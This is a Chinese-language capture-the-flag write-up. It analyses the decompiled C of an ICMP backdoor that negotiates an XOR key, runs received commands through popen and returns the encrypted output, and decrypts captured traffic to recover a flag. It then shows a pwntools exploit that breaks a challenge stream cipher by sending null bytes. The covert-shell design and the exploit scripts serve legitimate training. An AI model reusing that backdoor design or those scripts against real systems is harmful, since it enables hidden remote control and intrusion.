<li><p>​<code>while ( recv(fd, s, 0x63BFuLL, 0) &lt;= 0 );</code>​ 循环接收 ICMP 包</p>
</li>
<li><p>生成密钥</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">v14 = &amp;s[<span class="number">20</span>];    </span><br><span class="line"><span class="comment">//分析可以得出 s[20] == 0xC 和 s[21] == 0x23 的时候进入这个判断，进行密钥的生成</span></span><br><span class="line"><span class="keyword">if</span> ( s[<span class="number">20</span>] == <span class="number">0xC</span> &amp;&amp; v14[<span class="number">1</span>] == <span class="number">0x23</span> )</span><br><span class="line">   &#123;</span><br><span class="line">	<span class="comment">// 取出 v14 + 1 处的一个 _WORD 赋值给 v6 这个地址，其实就是接收的包的 s[22]、s[23]</span></span><br><span class="line">     *(_WORD *)v6 = *((_WORD *)v14 + <span class="number">1</span>);</span><br><span class="line">	<span class="comment">// 生成两个随机数赋值给 v6[2] 和 v6[3]</span></span><br><span class="line">     v6[<span class="number">2</span>] = rand();</span><br><span class="line">     v6[<span class="number">3</span>] = rand();</span><br><span class="line">	<span class="comment">// 密钥的后面 4 个是由 前面4个字节变换出来的</span></span><br><span class="line">     v6[<span class="number">4</span>] = v6[<span class="number">0</span>] ^ v6[<span class="number">1</span>];</span><br><span class="line">     v6[<span class="number">5</span>] = v6[<span class="number">2</span>] ^ v6[<span class="number">3</span>];</span><br><span class="line">     v6[<span class="number">6</span>] = v6[<span class="number">0</span>] ^ v6[<span class="number">2</span>];</span><br><span class="line">     v6[<span class="number">7</span>] = v6[<span class="number">1</span>] ^ v6[<span class="number">3</span>];</span><br><span class="line">	<span class="comment">// 到这里密钥就由 ICMP 携带的两个字节以及生成的两个随机数以及他们变换出来的 4 个直接共同组成密钥，存储在了 v6</span></span><br><span class="line">     <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">     addr.sa_family = <span class="number">2</span>;</span><br><span class="line">     *(_DWORD *)&amp;addr.sa_data[<span class="number">2</span>] = *((_DWORD *)s_1 + <span class="number">3</span>);</span><br><span class="line">     buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// 这里只把随机生成的两个字节（一个WORD）最为回包发送出去</span></span><br><span class="line">     *(_WORD *)&amp;buf[<span class="number">2</span>] = *(_WORD *)&amp;v6[<span class="number">2</span>];</span><br><span class="line">     sleep(<span class="number">1u</span>);</span><br><span class="line">     sendto(fd, buf, v12 + <span class="number">8LL</span>, <span class="number">0</span>, &amp;addr, <span class="number">0x10</span>u);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li>
<li><p>执行命令</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">   n28 = <span class="number">28</span>;</span><br><span class="line">......</span><br><span class="line"><span class="comment">// 当 s[20] == 0x13 和 s[21] == 0x2A 的时候进入这个判断，执行命令</span></span><br><span class="line"><span class="keyword">if</span> ( *v14 == <span class="number">0x13</span> &amp;&amp; v14[<span class="number">1</span>] == <span class="number">0x2A</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     addr.sa_family = <span class="number">2</span>;</span><br><span class="line">     *(_DWORD *)&amp;addr.sa_data[<span class="number">2</span>] = *((_DWORD *)s_1 + <span class="number">3</span>);</span><br><span class="line">     <span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest));</span><br><span class="line">     <span class="built_in">memcpy</span>(dest, &amp;s[n28], (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">25535</span> - n28));</span><br><span class="line">     <span class="keyword">for</span> ( i = <span class="number">25536</span>; ; --i )</span><br><span class="line">     &#123;</span><br><span class="line">       i_1 = i;</span><br><span class="line">       <span class="keyword">if</span> ( i_1 &lt; <span class="built_in">strlen</span>(dest) || dest[i - <span class="number">1</span>] )</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="comment">// 需要关注的是这里，会把传入的数据和 v6 也就是上个步骤生成 key 进行循环异或</span></span><br><span class="line">     <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; i; ++j )</span><br><span class="line">       dest[j] ^= v6[j &amp; <span class="number">7</span>];</span><br><span class="line">     <span class="built_in">puts</span>(dest);</span><br><span class="line">     fflush(_bss_start);</span><br><span class="line"><span class="comment">// 传入 popen 执行 </span></span><br><span class="line">     stream = popen(dest, <span class="string">&quot;r&quot;</span>);</span><br></pre></td></tr></table></figure></li>
<li><p>返回执行结果</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// 执行传进来的命令</span></span><br><span class="line"> stream = popen(dest, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( stream )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest));</span><br><span class="line">      <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line"><span class="comment">// 获取执行结果</span></span><br><span class="line">      <span class="keyword">while</span> ( fgets(s, <span class="number">25536</span>, stream) )</span><br><span class="line">      &#123;</span><br><span class="line">        v1 = <span class="built_in">strlen</span>(dest);</span><br><span class="line">        <span class="keyword">if</span> ( v1 + <span class="built_in">strlen</span>(s) &gt; <span class="number">0x63BE</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(dest, s);</span><br><span class="line">      &#125;</span><br><span class="line">      pclose(stream);</span><br><span class="line">      i = <span class="built_in">strlen</span>(dest);</span><br><span class="line"><span class="comment">// 把执行结果和 key 进行异或</span></span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; i; ++j )</span><br><span class="line">        dest[j] ^= v6[j &amp; <span class="number">7</span>];</span><br><span class="line">   	......</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; j_1; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        buf[<span class="number">0</span>] = <span class="number">8</span>;</span><br><span class="line">        i_4 = i_3;</span><br><span class="line">        <span class="keyword">if</span> ( i_3 &gt; <span class="number">0x10</span> )</span><br><span class="line">          i_4 = <span class="number">16</span>;</span><br><span class="line">        i_5 = i_4;</span><br><span class="line"><span class="comment">// 给每个数据打上序号</span></span><br><span class="line">        <span class="built_in">sprintf</span>(&amp;buf[<span class="number">8</span>], <span class="string">&quot;%04d%04d&quot;</span>, j + <span class="number">1</span>, j_1);</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;buf[<span class="number">16</span>], &amp;dest[v19], i_5);</span><br><span class="line">        v19 += i_5;</span><br><span class="line">        i_3 -= i_5;</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line"><span class="comment">// 回复 ICMP</span></span><br><span class="line">        sendto(fd, buf, i_5 + <span class="number">16LL</span>, <span class="number">0</span>, &amp;addr, <span class="number">0x10</span>u);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>至此分析完了这个程序的功能，可以看出这个其实是一个基于 ICMP 的后门，通讯的流程为</p>
<ol>
<li>向运行pwntopiashl的服务器发送一个 icmp 包，type  ** 0xC 和 code **  0x23 进行密钥生成，为下一步执行命令做准备</li>
<li>向运行pwntopiashl的服务器发送一个 icmp 包，type  ** 0x13 和 code **  0x2A 执行命令，命令使用第一步协商的密钥进行加密</li>
<li>回复命令执行结果，使用 key 加密</li>
</ol>
<p>‍</p>
<p>所以给的 pcap 就是执行命令的流量，需要我们解密这个流量</p>
<p>需要知道的是 key 的组成，是由发起者发送的嵌在ICMP里面的 2 个字节，后门生成的 2 个字节，以及这 4 个直接拼接起来后变换出来的 4 个直接，一共 8 个字节，首先筛选出这个流量包，以第一次执行命令的流量为例，首先 1.3.3.7 向 7.3.3.1 发送了一个 type 为 12 (0xc)，code 为 35 （0x23）的 ICMP 包，在 code 的后面在本应该是 checksum 的位置携带了 2 个字节 da0a</p>
<p><img src="/assets/image-20250602203739-eklexji.png" alt="image"></p>
<p>‍</p>
<p>7.3.3.1 的相应包中携带了 key 的两个字节 dee0 ，一样也在 checksum 的位置</p>
<p><img src="/assets/image-20250602203750-6ktsy5r.png" alt="image"></p>
<p>​​</p>
<p>到这里密钥协商完成，得出key的前4个字节，生成剩下的 4 个字节即可获得 key</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">b&quot;\xda\x0a\xde\xe0&quot;</span></span><br><span class="line">key += <span class="built_in">bytes</span>([key[<span class="number">0</span>] ^ key[<span class="number">1</span>]])</span><br><span class="line">key += <span class="built_in">bytes</span>([key[<span class="number">2</span>] ^ key[<span class="number">3</span>]])</span><br><span class="line">key += <span class="built_in">bytes</span>([key[<span class="number">0</span>] ^ key[<span class="number">2</span>]])</span><br><span class="line">key += <span class="built_in">bytes</span>([key[<span class="number">1</span>] ^ key[<span class="number">3</span>]])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.<span class="built_in">hex</span>(key))</span><br><span class="line"><span class="comment"># da0adee0d03e04ea</span></span><br></pre></td></tr></table></figure>

<p>依次类推可以推出所有的 key</p>
<p>然后就是执行命令的数据包</p>
<p>执行命令的 icmp 包为：<code>s[20] == 0x13 和 s[21] == 0x2A</code>​，也就是 type 为 19 (0x13)，code 为 42 （0x2a）</p>
<p>跳过ICMP头（8字节）得到数据 b36e</p>
<p><img src="/assets/image-20250602203803-d3mfu1n.png" alt="image"></p>
<p>​​</p>
<p>组合起来就是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">b&quot;\xda\x0a\xde\xe0&quot;</span></span><br><span class="line">key += <span class="built_in">bytes</span>([key[<span class="number">0</span>] ^ key[<span class="number">1</span>]])</span><br><span class="line">key += <span class="built_in">bytes</span>([key[<span class="number">2</span>] ^ key[<span class="number">3</span>]])</span><br><span class="line">key += <span class="built_in">bytes</span>([key[<span class="number">0</span>] ^ key[<span class="number">2</span>]])</span><br><span class="line">key += <span class="built_in">bytes</span>([key[<span class="number">1</span>] ^ key[<span class="number">3</span>]])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.<span class="built_in">hex</span>(key))</span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;b36e&quot;</span>)</span><br><span class="line">result = <span class="built_in">bytes</span>([enc[j] ^ key[j % <span class="built_in">len</span>(key)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc))])</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># da0adee0d03e04ea</span></span><br><span class="line"><span class="comment"># b&#x27;id&#x27;</span></span><br></pre></td></tr></table></figure>

<p>依次类推，解密所有执行的命令</p>
<p>最后一条命令应该就是加密了 flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> .secret | openssl enc -aes-256-cbc -a -salt -pbkdf2 -pass pass:we_pwned_nops</span><br></pre></td></tr></table></figure>

<p>​​</p>
<p><img src="/assets/image-20250602203813-z2h1387.png" alt="image"></p>
<p>单独解密这个返回包数据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = bytes.fromhex(<span class="string">&quot;bf389a3784df6025b23bf737a4fc0329de409f3cb4f07a0ca765f30d93db7d279d72ae2dbad9792a896c9073b9a0552b804d9a088fab5c3eab63a53199e00121e0&quot;</span>)</span><br><span class="line">key = bytes.fromhex(<span class="string">&quot;ea0adc44e098364e&quot;</span>)</span><br><span class="line">result = bytes([a[j] ^ key[j % len(key)] <span class="keyword">for</span> j <span class="keyword">in</span> range(len(a))])</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment"># U2FsdGVkX1+sDd5g4JCxThLBMo/IsCKiwxriZAOdcfL7Y8cejGFLo3jpAiyuyx7o</span></span><br></pre></td></tr></table></figure>

<p>N0PS{v3Ry_s734lThY_1cMP_sh3Ll}得出 openssl aes-256-cbc 加密后的密文，使用 openssl 解密，得出 flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> U2FsdGVkX1+sDd5g4JCxThLBMo/IsCKiwxriZAOdcfL7Y8cejGFLo3jpAiyuyx7o | <span class="built_in">base64</span> -d |  openssl enc -aes-256-cbc -d -salt -pbkdf2 -pass pass:we_pwned_nops</span><br><span class="line">N0PS&#123;v3Ry_s734lThY_1cMP_sh3Ll&#125;</span><br></pre></td></tr></table></figure>

<p>‍</p>
<p>可以用 scapy 实现自动提取解密</p>
<p>但是，我没写。。。。</p>
<p>只有草稿</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">from scapy.layers.inet import ICMP</span><br><span class="line"></span><br><span class="line">k = b<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">def extract_key(packet):</span><br><span class="line">    <span class="keyword">if</span> ICMP <span class="keyword">in</span> packet and packet[ICMP].<span class="built_in">type</span> == 12 and packet[ICMP].code == 35:</span><br><span class="line">        icmp_data = bytes(packet[ICMP])</span><br><span class="line">        <span class="keyword">if</span> len(icmp_data) &gt;= 6:</span><br><span class="line"></span><br><span class="line">            key = icmp_data[2:4]  <span class="comment"># 假设v6在偏移4-5字节</span></span><br><span class="line">            src_ip = packet[IP].src</span><br><span class="line">            <span class="keyword">if</span> key == b<span class="string">&quot;\x3c\xff&quot;</span>:</span><br><span class="line">                key += b<span class="string">&quot;\xb4\xe8&quot;</span></span><br><span class="line">            <span class="keyword">if</span> key == b<span class="string">&quot;\xda\x0a&quot;</span>:</span><br><span class="line">                key += b<span class="string">&quot;\xde\xe0&quot;</span></span><br><span class="line">            <span class="keyword">if</span> key == b<span class="string">&quot;\xea\x0a&quot;</span>:</span><br><span class="line">                key += b<span class="string">&quot;\xdc\x44&quot;</span></span><br><span class="line">            <span class="keyword">if</span> key == b<span class="string">&quot;\x56\x3d&quot;</span>:</span><br><span class="line">                key += b<span class="string">&quot;\x93\x70&quot;</span></span><br><span class="line">            global k</span><br><span class="line">            key += bytes([key[0] ^ key[1]])</span><br><span class="line">            key += bytes([key[2] ^ key[3]])</span><br><span class="line">            key += bytes([key[0] ^ key[2]])</span><br><span class="line">            key += bytes([key[1] ^ key[3]])</span><br><span class="line"></span><br><span class="line">            k = key</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;======================================================================&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Found key&quot;</span>, bytes.hex(k))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt_data(data, key):</span><br><span class="line">    decrypted = []</span><br><span class="line">    key_len = len(key)</span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> enumerate(data):</span><br><span class="line">        decrypted.append(byte ^ key[i % key_len])</span><br><span class="line">    <span class="built_in">return</span> bytes(decrypted)</span><br><span class="line"></span><br><span class="line">def process_packet(packet):</span><br><span class="line">    <span class="keyword">if</span> IP <span class="keyword">in</span> packet and ICMP <span class="keyword">in</span> packet:</span><br><span class="line">        icmp = packet[ICMP]</span><br><span class="line">        <span class="comment"># 处理攻击者的命令包（类型19，代码42）</span></span><br><span class="line">        <span class="keyword">if</span> icmp.type == 19 and icmp.code == 42:</span><br><span class="line">            src_ip = packet[IP].src</span><br><span class="line">            <span class="keyword">if</span> True:</span><br><span class="line">                key = k</span><br><span class="line">                encrypted_data = bytes(icmp)[8:]</span><br><span class="line">                <span class="built_in">print</span>(bytes.hex(encrypted_data))</span><br><span class="line">                decrypted = decrypt_data(encrypted_data, key)</span><br><span class="line">                <span class="built_in">print</span>(f<span class="string">&quot;Decrypted command from &#123;src_ip&#125;: &#123;decrypted.decode(errors=&#x27;ignore&#x27;)&#125;&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> icmp.type == 0:</span><br><span class="line">            dst_ip = packet[IP].dst</span><br><span class="line">            <span class="keyword">if</span> True:</span><br><span class="line">                key = k</span><br><span class="line">                <span class="comment"># 跳过ICMP头8字节</span></span><br><span class="line">                encrypted_data = bytes(icmp)[8:]</span><br><span class="line">                <span class="built_in">print</span>(bytes.hex(encrypted_data))</span><br><span class="line">                decrypted = decrypt_data(encrypted_data, key)</span><br><span class="line">                <span class="built_in">print</span>(f<span class="string">&quot;Decrypted response to &#123;dst_ip&#125;: &#123;decrypted.decode(errors=&#x27;ignore&#x27;)&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">packets = rdpcap(<span class="string">&#x27;capture.pcap&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pkt <span class="keyword">in</span> packets:</span><br><span class="line">    <span class="keyword">if</span> ICMP <span class="keyword">in</span> pkt:</span><br><span class="line">        extract_key(pkt)</span><br><span class="line">        process_packet(pkt)</span><br><span class="line"></span><br><span class="line">a = bytes.fromhex(<span class="string">&quot;bf389a3784df6025b23bf737a4fc0329de409f3cb4f07a0ca765f30d93db7d279d72ae2dbad9792a896c9073b9a0552b804d9a088fab5c3eab63a53199e00121e0&quot;</span>)</span><br><span class="line">key = bytes.fromhex(<span class="string">&quot;ea0adc44e098364e&quot;</span>)</span><br><span class="line">result = bytes([a[j] ^ key[j % len(key)] <span class="keyword">for</span> j <span class="keyword">in</span> range(len(a))])</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment"># U2FsdGVkX1+sDd5g4JCxThLBMo/IsCKiwxriZAOdcfL7Y8cejGFLo3jpAiyuyx7o</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bf389a3784df6025b23bf737a4fc0329</span></span><br><span class="line"><span class="comment"># de409f3cb4f07a0ca765f30d93db7d27</span></span><br><span class="line"><span class="comment"># 9d72ae2dbad9792a896c9073b9a0552b</span></span><br><span class="line"><span class="comment"># 804d9a088fab5c3eab63a53199e00121e0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># echo U2FsdGVkX1+sDd5g4JCxThLBMo/IsCKiwxriZAOdcfL7Y8cejGFLo3jpAiyuyx7o | base64 -d |  openssl enc -aes-256-cbc -d -salt -pbkdf2 -pass pass:we_pwned_nops</span></span><br></pre></td></tr></table></figure>

<h1 id="Break-My-Stream"><a href="#Break-My-Stream" class="headerlink" title="Break My Stream"></a>Break My Stream</h1><p>题目:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CrypTopiaSC</span>:</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">KSA</span>(<span class="params">key, n</span>):</span><br><span class="line">        S = <span class="built_in">list</span>(<span class="built_in">range</span>(n))</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            j = ((j + S[i] + key[i % <span class="built_in">len</span>(key)]) &gt;&gt; <span class="number">4</span> | (j - S[i] + key[i % <span class="built_in">len</span>(key)]) &lt;&lt; <span class="number">4</span>) &amp; (n-<span class="number">1</span>)</span><br><span class="line">            S[i], S[j] = S[j], S[i]</span><br><span class="line">        <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">PRGA</span>(<span class="params">S, n</span>):</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            i = (i+<span class="number">1</span>) &amp; (n-<span class="number">1</span>)</span><br><span class="line">            j = (j+S[i]) &amp; (n-<span class="number">1</span>)</span><br><span class="line">            S[i], S[j] = S[j], S[i]</span><br><span class="line">            <span class="keyword">yield</span> S[((S[i] + S[j]) &gt;&gt; <span class="number">4</span> | (S[i] - S[j]) &lt;&lt; <span class="number">4</span>) &amp; (n-<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key, n=<span class="number">256</span></span>):</span><br><span class="line">        self.KeyGenerator = self.PRGA(self.KSA(key, n), n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, message</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([char ^ <span class="built_in">next</span>(self.KeyGenerator) <span class="keyword">for</span> char <span class="keyword">in</span> message])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag = <span class="string">b&quot;XXX&quot;</span></span><br><span class="line">    key = os.urandom(<span class="number">256</span>)</span><br><span class="line">    encrypted_flag = CrypTopiaSC(key).encrypt(flag)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome to our first version of CrypTopia Stream Cipher!\nYou can here encrypt any message you want.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Oh, one last thing: <span class="subst">&#123;encrypted_flag.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        pt = <span class="built_in">input</span>(<span class="string">&quot;Enter your message: &quot;</span>).encode()</span><br><span class="line">        ct = CrypTopiaSC(key).encrypt(pt)</span><br><span class="line">        <span class="built_in">print</span>(ct.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>这个题目给了一大推代码故弄玄虚，其实就是 encrypt 这里，简单的把密钥和输入的消息进行了异或，直接输入和flag一样长度的 \x00 即可得出 key，因为任何数据和 0 异或都得到他本身<br>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;0.cloud.chals.io&quot;</span>,<span class="number">31561</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Oh, one last thing: &quot;</span>)</span><br><span class="line">enc_flag_hex = r.recvline().strip().decode()</span><br><span class="line"><span class="built_in">print</span>(enc_flag_hex)</span><br><span class="line">enc_flag = <span class="built_in">bytes</span>.fromhex(enc_flag_hex)</span><br><span class="line">L = <span class="built_in">len</span>(enc_flag)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;Enter your message: &quot;</span>, <span class="string">b&#x27;\x00&#x27;</span> * L)</span><br><span class="line">ct_hex = r.recvline().strip().decode()</span><br><span class="line">ct = <span class="built_in">bytes</span>.fromhex(ct_hex)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;key is: &quot;</span>, ct)</span><br><span class="line"></span><br><span class="line">key_stream = ct</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bytes</span>([enc_flag[i] ^ key_stream[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(L)])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Flag: <span class="subst">&#123;flag.decode()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="G-Bee-S"><a href="#G-Bee-S" class="headerlink" title="G-Bee-S"></a>G-Bee-S</h1><p>旅行商问题（TSP）</p>
